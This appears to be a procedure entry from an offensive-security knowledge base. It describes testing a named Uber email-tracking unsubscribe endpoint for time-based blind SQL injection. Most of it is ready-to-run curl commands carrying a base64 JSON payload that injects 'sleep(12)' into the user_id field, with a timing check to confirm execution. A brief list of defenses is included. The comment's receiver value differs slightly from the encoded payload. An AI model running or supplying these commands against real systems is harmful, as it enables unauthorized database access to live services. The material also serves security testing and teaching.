---
id: proc-uber-sqli-test-001
tags:
  - sqli
  - blind-sqli
  - testing
type: procedure
tools:
  - '[[tools/Python-Requests-Library]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/uber-unsubscribe-sqli-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.140Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Unsubscribe-Endpoint-for-SQL-Injection

## Summary

This procedure tests a web application's unsubscribe endpoint for time-based blind SQL injection vulnerability by injecting a SLEEP function into the user_id parameter of a base64-encoded JSON payload, observing response delays to confirm SQL execution.

## Description

In the context of email tracking services like Sendcloud used by Uber, the unsubscribe link processes a GET parameter 'p' containing base64-encoded JSON with user_id and receiver fields. Unsanitized user_id allows SQL injection. This procedure modifies the payload to include 'and sleep(12)=1' and measures response time, applicable to MySQL backends where timing differences indicate vulnerability without visible errors.

## Requirements

1. Access to a target email with unsubscribe link (e.g., http://sctrack.email.uber.com.cn/track/unsubscribe.do)
2. Tool for sending HTTP GET requests (e.g., curl or Python requests)
3. Ability to decode/encode base64 and JSON
4. Timer to measure response delays

## Defense

Defensive measures and detection strategies:

- Implement prepared statements or parameterized queries for all user inputs
- Use web application firewalls (WAF) to detect SQL keywords like 'sleep' or 'and'
- Rate-limit requests to unsubscribe endpoints to prevent timing attacks
- Log and monitor unusual response times or repeated requests from the same IP

## Objectives

1. Confirm SQL injection vulnerability in the endpoint
2. Validate time-based blind injection feasibility
3. Identify potential for further exploitation

## Instructions

### Step 1: Decode and Modify Payload

**Context**: Extract the base64 'p' parameter from the unsubscribe link, decode it to JSON, and inject the SQL payload into user_id.

**Command** ([[commands/uber-unsubscribe-sqli-poc]]):
```bash
# Manually: Decode original p, set user_id to "5755 and sleep(12)=1", receiver to "orange@myemail", encode JSON to base64
curl -G "http://sctrack.email.uber.com.cn/track/unsubscribe.do" --data-urlencode "p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ=="
```

> This sends the modified request; time the response from start to completion.

### Step 2: Observe Response

**Context**: Send the request and measure delay to confirm injection.

**Command** ([[commands/uber-unsubscribe-sqli-poc]]):
```bash
# Use curl with timing: time curl ...
(time curl -G "http://sctrack.email.uber.com.cn/track/unsubscribe.do" --data-urlencode "p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==") 2>&1 | grep real
```

> Expect ~12-second delay if vulnerable; normal response is near-instant.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/uber-unsubscribe-sqli-poc]]

## Tools Used

- [[tools/Python-Requests-Library]]

## Tags

- sqli
- testing
